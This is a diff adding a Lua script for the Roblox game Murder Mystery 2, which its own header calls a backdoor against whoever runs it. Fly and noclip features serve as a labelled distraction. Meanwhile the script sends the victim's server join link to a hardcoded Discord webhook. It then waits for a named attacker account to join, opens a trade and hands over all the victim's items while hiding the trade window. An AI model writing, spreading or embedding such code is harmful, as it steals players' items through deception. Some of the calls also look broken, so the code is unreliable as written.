@@ -1,0 +1,166 @@
+--[[
+    sysrfx::MM2_AUTO_TRADE_BACKDOOR
+    Target: Anyone who executes this script.
+    Attacker: Hardcoded username receives all items.
+--]]
+
+local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"   -- REPLACE THIS
+local attackerUsername = "FEARACCE" -- REPLACE THIS
+
+-- ========================================
+-- COMPONENT A: Send server join link to Discord
+-- ========================================
+local function sendWebhook(msg)
+    local success, result = pcall(function()
+        if syn then
+            syn.request({ Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({ content = msg }) })
+        elseif http then
+            http.request({ url = webhookURL, method = "POST", headers = {["Content-Type"] = "application/json"}, data = game:GetService("HttpService"):JSONEncode({ content = msg }) })
+        elseif http_request then
+            http_request({ Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({ content = msg }) })
+        elseif request then
+            request({ Url = webhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({ content = msg }) })
+        else
+            print("No HTTP function. Webhook failed.")
+        end
+    end)
+end
+
+local placeId = game.PlaceId
+local jobId = game.JobId
+local joinLink = "https://www.roblox.com/games/" .. placeId .. "?serverId=" .. jobId
+sendWebhook("MM2 Server: " .. joinLink)
+
+-- ========================================
+-- COMPONENT B: Fly + Noclip (distraction)
+-- ========================================
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local rootPart = char:WaitForChild("HumanoidRootPart")
+local flying = false
+local noclip = false
+local speed = 50
+
+local function toggleFly()
+    flying = not flying
+    if flying then
+        local bv = Instance.new("BodyVelocity")
+        bv.MaxForce = Vector3.new(4000,4000,4000)
+        bv.Velocity = Vector3.new(0,0,0)
+        bv.Parent = rootPart
+        game:GetService("RunService").Heartbeat:Connect(function()
+            if flying then
+                local move = Vector3.new(0,0,0)
+                if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.W) then move = move + Vector3.new(0,0,-1) end
+                if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.S) then move = move + Vector3.new(0,0,1) end
+                if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.A) then move = move + Vector3.new(-1,0,0) end
+                if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.D) then move = move + Vector3.new(1,0,0) end
+                if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.Space) then move = move + Vector3.new(0,1,0) end
+                if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftShift) then move = move + Vector3.new(0,-1,0) end
+                bv.Velocity = move.Magnitude > 0 and move.Unit * speed or Vector3.new(0,0,0)
+            end
+        end)
+    else
+        for _,v in pairs(rootPart:GetChildren()) do if v:IsA("BodyVelocity") then v:Destroy() end end
+    end
+end
+
+local function toggleNoclip()
+    noclip = not noclip
+    for _, part in pairs(char:GetDescendants()) do
+        if part:IsA("BasePart") then part.CanCollide = not noclip end
+    end
+end
+
+game:GetService("UserInputService").InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.F then toggleFly() end
+    if input.KeyCode == Enum.KeyCode.V then toggleNoclip() end
+end)
+
+-- ========================================
+-- COMPONENT C: Auto-Trade (only to attackerUsername)
+-- ========================================
+local function getTradeGui()
+    local gui = player:FindFirstChild("PlayerGui")
+    if not gui then return nil end
+    local function findTrade(frame)
+        for _, child in pairs(frame:GetChildren()) do
+            if child:IsA("Frame") and (child.Name:lower():find("trade") or child.Name:lower():find("guı")) then return child end
+            local found = findTrade(child)
+            if found then return found end
+        end
+        return nil
+    end
+    return findTrade(gui)
+end
+
+local function acceptTrade()
+    local tradeGui = getTradeGui()
+    if tradeGui then
+        for _, child in pairs(tradeGui:GetDescendants()) do
+            if child:IsA("TextButton") and (child.Name:lower():find("accept") or child.Name:lower():find("confirm")) then
+                child:FireServer()
+                tradeGui.Visible = false
+                return true
+            end
+        end
+    end
+    return false
+end
+
+local function addAllItems()
+    local tradeGui = getTradeGui()
+    if not tradeGui then return false end
+    local count = 0
+    for _, slot in pairs(tradeGui:GetDescendants()) do
+        if slot:IsA("Frame") and (slot.Name:lower():find("slot") or slot.Name:lower():find("item")) then
+            local btn = slot:FindFirstChild("Select") or slot:FindFirstChild("Add")
+            if btn and btn:IsA("TextButton") then
+                btn:FireServer()
+                count = count + 1
+            end
+        end
+    end
+    return count > 0
+end
+
+local function initiateTrade(target)
+    for _, service in pairs(game:GetChildren()) do
+        if service:IsA("ReplicatedStorage") then
+            for _, obj in pairs(service:GetChildren()) do
+                if obj:IsA("RemoteEvent") and (obj.Name:lower():find("trade") or obj.Name:lower():find("request")) then
+                    obj:FireServer(target)
+                    return true
+                end
+            end
+        end
+    end
+    return false
+end
+
+-- Main loop: wait for attacker to join
+spawn(function()
+    local attacker = nil
+    while not attacker do
+        for _, plr in pairs(game.Players:GetPlayers()) do
+            if plr.Name == attackerUsername and plr ~= player then
+                attacker = plr
+                break
+            end
+        end
+        wait(1)
+    end
+    print("Attacker found: " .. attacker.Name)
+    wait(3) -- let them load
+    if initiateTrade(attacker) then
+        wait(2)
+        acceptTrade()  -- first accept
+        wait(2)
+        addAllItems()  -- add all items
+        wait(2)
+        acceptTrade()  -- final confirm
+        print("Trade completed. All items sent to " .. attacker.Name)
+    end
+end)
+
+print("MM2 Script loaded. Fly: F, Noclip: V. Hidden trade automation active.")
